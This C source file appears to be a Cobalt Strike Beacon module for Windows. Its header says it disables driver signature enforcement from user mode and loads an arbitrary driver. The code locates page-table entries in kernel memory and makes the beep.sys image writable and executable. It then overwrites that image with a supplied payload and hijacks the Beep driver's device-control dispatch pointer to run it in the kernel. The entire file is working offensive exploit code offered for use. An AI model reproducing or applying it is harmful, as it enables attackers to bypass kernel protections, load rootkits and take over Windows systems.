/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Attempts to use the elevated thread to
 * to disable DSE by modifying the PTE
 * and overwriting g_CiOptions.
 *
**/

D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_ PAPI Api, _In_ PVOID Buffer, _In_ ULONG Length )
{
	HANDLE				Dev = NULL;
	PVOID				Img = NULL;

	PVOID				Ctr = NULL;
	PVOID				Obj = NULL;
	PVOID				Pte = NULL;
	PVOID				Tgt = NULL;
	PVOID				Ptb = NULL;
	PBYTE				Ptr = NULL;
	PVOID				Map = NULL;
	PCHAR				Str = NULL;
	ULONG				Len = 0;
	PSYSTEM_MODULE_INFORMATION 	Inf = NULL;

	hde64s				Hde;
	
	FILE_OBJECT			Flo;
	DEVICE_OBJECT			Dvo;
	DRIVER_OBJECT			Drv;

	MMPTE				Mmp;
	UNICODE_STRING			Uni;
	IO_STATUS_BLOCK			Ios;
	OBJECT_ATTRIBUTES		Att;
	RTL_OSVERSIONINFOW		Ver;

	RtlSecureZeroMemory( &Mmp, sizeof( Mmp ) );
	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
	RtlSecureZeroMemory( &Flo, sizeof( Flo ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Ios, sizeof( Ios ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );

	Ver.dwOSVersionInfoSize = sizeof( Ver );
	Api->RtlGetVersion( &Ver );

	/* Get size! */
	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, NULL, 0, &Len ) ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info length." ) ) );
		goto Leave;
	};

	/* Get ptrs! */
	if ( !( Inf = Api->LocalAlloc( LPTR, Len ) ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not allocate module info." ) ) );
		goto Leave;
	};

	/* Get info! */
	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, Inf, Len, NULL ) >= 0 ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info." ) ) );
		goto Leave;
	};

	/* Enumerate modules! */
	for ( ULONG Idx = 0 ; Idx < Inf->Count ; ++Idx ) {
		Str = C_PTR( U_PTR( Inf->Module[ Idx ].FullPathName ) + Inf->Module[ Idx ].OffsetToFileName );

		if ( HashString( Str, 0 ) == H_STR_BEEP ) {
			Tgt = Inf->Module[ Idx ].ImageBase;
		};
		/* Is NTOSKRNL.EXE? */
		if ( HashString( Str, 0 ) == H_STR_NTOSKRNL ) {
			Img = Inf->Module[ Idx ].ImageBase;
		};

		if ( ( Tgt != NULL ) && ( Img != NULL ) ) 
		{
			Map = Api->LoadLibraryEx( C_PTR( G_SYM( "C:\\Windows\\System32\\ntoskrnl.exe" ) ), NULL, DONT_RESOLVE_DLL_REFERENCES );

			if ( Map != NULL )
			{
				/* Greater than RS1 ! */
				if ( Ver.dwBuildNumber >= 14393 ) {
					Ptr = PeGetFuncEat( Map, H_STR_MMFREENONCACHEDMEMORY );

					if ( Ptr ) 
					{
						ULONG Off = 0;
						ULONG Rel = 0;

						do
						{
							hde64_disasm( &Ptr[ Off ], &Hde );

							if ( Hde.flags & F_ERROR ) {
								break;
							};
							if ( Hde.len == 5 ) {
								if ( Ptr[ Off ] == 0xE8 ) {
									Rel = *( ULONG * )( Ptr + Off + 1 );
									break;
								};
							};
							Off = Off + Hde.len;
						} while ( Off < 256 );

						Ptr = C_PTR( U_PTR( Ptr ) + Off + 5 + Rel );
						Ptr = C_PTR( U_PTR( Img ) + ( U_PTR( Ptr ) - U_PTR( Map ) ) );
						Ptr = C_PTR( U_PTR( Ptr ) - 0x100000000 );

						if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), C_PTR( U_PTR( Ptr ) + 0x13 ), &Ptb, sizeof( Ptb ), NULL ) >= 0 ) ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read pte base." ) ) );
							goto Leave;
						};
					};
				} else {
					/* Static before RS1 */
					Ptb = C_PTR( 0xFFFFF68000000000 );
				};

				if ( Ptb != NULL ) 
				{
					Pte = C_PTR( U_PTR( U_PTR( Tgt ) >> 9 ) );
					Pte = C_PTR( U_PTR( U_PTR( Pte ) & 0x7ffffffff8 ) );
					Pte = C_PTR( U_PTR( U_PTR( Pte ) + U_PTR( Ptb ) ) );

					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Mmp, sizeof( Mmp ), NULL ) ) 
					{
						/* Add W* and X* */
						Mmp.u.Hard.NoExecute = 0;
						Mmp.u.Hard.Write     = 1;

						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Mmp, sizeof( Mmp ), NULL ) ) 
						{
							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Tgt, Buffer, Length, NULL ) >= 0 ) ) {
								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write to header." ) ) );
								goto Leave;
							};

							RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
							RtlSecureZeroMemory( &Att, sizeof( Att ) );
							RtlSecureZeroMemory( &Ios, sizeof( Ios ) );

							Api->RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"\\Device\\Beep" ) ) );
							InitializeObjectAttributes( &Att, &Uni, 0x40, NULL, NULL );

							if ( !( Api->NtOpenFile( &Dev, FILE_READ_DATA, &Att, &Ios, FILE_SHARE_READ, OPEN_EXISTING ) >= 0 ) ) {
								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not open beep device." ) ) );
								goto Leave;
							};
							if ( !( Obj = ObjFromHandle( BeaconApi, Api, Dev ) ) ) {
								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get object address." ) ) );
								goto Leave;
							};
							if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Obj, &Flo, sizeof( Flo ), NULL ) >= 0 ) ) {
								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read file object." ) ) );
								goto Leave;
							};
							if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Flo.DeviceObject, &Dvo, sizeof( Dvo ), NULL ) >= 0 ) ) {
								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read device object." ) ) );
								goto Leave;
							};
							if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Dvo.DriverObject, &Drv, sizeof( Drv ), NULL ) >= 0 ) ) {
								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read driver object." ) ) );
								goto Leave;
							};

							Ctr = C_PTR( Drv.MajorFunction[ 0x0e ] );
							Drv.MajorFunction[ 0x0e ] = C_PTR( Tgt );

							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Dvo.DriverObject, &Drv, sizeof( Drv ), NULL ) >= 0 ) ) {
								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write driver object." ) ) );
								goto Leave;
							};

							Api->Beep( 37, 1 );

							Tgt = C_PTR( Drv.MajorFunction[ 0x0e ] );
							Drv.MajorFunction[ 0x0e ] = C_PTR( Ctr );

							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Dvo.DriverObject, &Drv, sizeof( Drv ), NULL ) >= 0 ) ) {
								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write driver object." ) ) );
								goto Leave;
							};
						} else {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not modify PTE." ) ) );
							goto Leave;
						};
					} else {
						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read pte control bit." ) ) );
						goto Leave;
					};
				} else {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read pte base." ) ) );
					goto Leave;
				};
			} else {
				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not load ntoskrnl.exe" ) ) );
				goto Leave;
			};
			break;
		};
	};
Leave:
	if ( Inf != NULL ) {
		Api->LocalFree( Inf );
	};
	if ( Map != NULL ) {
		Api->FreeLibrary( Map );
	};
	if ( Dev != NULL ) {
		Api->NtClose( Dev );
	};
};
